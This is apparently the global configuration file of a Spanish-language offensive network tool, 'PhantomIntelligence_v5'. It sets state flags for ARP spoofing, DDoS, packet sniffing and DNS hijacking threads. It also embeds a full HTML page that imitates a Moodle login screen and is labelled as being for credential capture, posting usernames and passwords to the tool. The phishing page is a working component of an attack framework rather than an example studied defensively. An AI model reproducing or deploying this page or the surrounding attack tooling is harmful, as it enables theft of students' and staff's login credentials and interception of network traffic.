"""
Configuración global y variables de estado para PhantomIntelligence_v5
"""

import os
import time
import threading
import queue

__all__ = [
    '_estado', '_dns_reglas', 'MAC', 'GATEWAY', 'IP_LOCAL', 'DIR_BASE',
    'SCAPY_OK', 'PSUTIL_OK', 'COL', 'PHISHING_PAGE_HTML'
]

# Estado global de hilos
_estado = {k: threading.Event() for k in ("arp", "ddos", "sniff", "dns", "alerta")}
_dns_reglas: dict[str, str] = {}

# Variables globales de red
MAC = None
GATEWAY = None
IP_LOCAL = None
DIR_BASE = None

# Dependencias opcionales
SCAPY_OK = False
PSUTIL_OK = False

# Colores para logs
COL = {
    "ok":    "#69f0ae",   # verde
    "warn":  "#ffca28",   # amarillo
    "err":   "#ff5252",   # rojo
    "info":  "#4fc3f7",   # azul claro
    "pkt":   "#ce93d8",   # lila
}

# HTML para captura de credenciales
PHISHING_PAGE_HTML = """\
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Moodle — tu-dominio.com</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{background:#f4f4f4;font-family:'Segoe UI',Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}
    .card{background:#fff;border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,.15);padding:44px 48px;width:380px}
    .logo{text-align:center;margin-bottom:28px}
    .logo img{width:80px}
    h1{font-size:1.4rem;font-weight:700;color:#1a1a2e;text-align:center;margin-bottom:6px}
    .subtitle{font-size:.85rem;color:#888;text-align:center;margin-bottom:28px}
    label{font-size:.85rem;color:#444;font-weight:600;display:block;margin-bottom:4px}
    input{width:100%;padding:10px 14px;border:1px solid #ddd;border-radius:8px;font-size:.95rem;margin-bottom:18px;outline:none;transition:border .2s}
    input:focus{border-color:#f98012}
    button{width:100%;padding:12px;background:linear-gradient(135deg,#f98012,#e05e00);color:#fff;border:none;border-radius:8px;font-size:1rem;font-weight:700;cursor:pointer;letter-spacing:.5px}
    button:hover{opacity:.92}
    .footer{text-align:center;margin-top:20px;font-size:.78rem;color:#bbb}
    .moodle-brand{color:#f98012;font-weight:800}
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">
      <svg width="70" height="70" viewBox="0 0 200 200" fill="none" xmlns="http://www.w3.org/2000/svg">
        <circle cx="100" cy="100" r="100" fill="#f98012"/>
        <text x="50%" y="54%" dominant-baseline="middle" text-anchor="middle" fill="white" font-size="90" font-family="Arial" font-weight="bold">M</text>
      </svg>
    </div>
    <h1>Iniciar sesión</h1>
    <p class="subtitle">Accede a tu cuenta <span class="moodle-brand">Moodle</span></p>
    <form method="POST" action="/login">
      <label for="username">Nombre de usuario</label>
      <input type="text" id="username" name="username" placeholder="Introduce tu usuario" required>
      <label for="password">Contraseña</label>
      <input type="password" id="password" name="password" placeholder="Introduce tu contraseña" required>
      <button type="submit">Acceder</button>
    </form>
    <p class="footer">tu-dominio.com &copy; 2025 — Plataforma educativa</p>
  </div>
</body>
</html>
"""
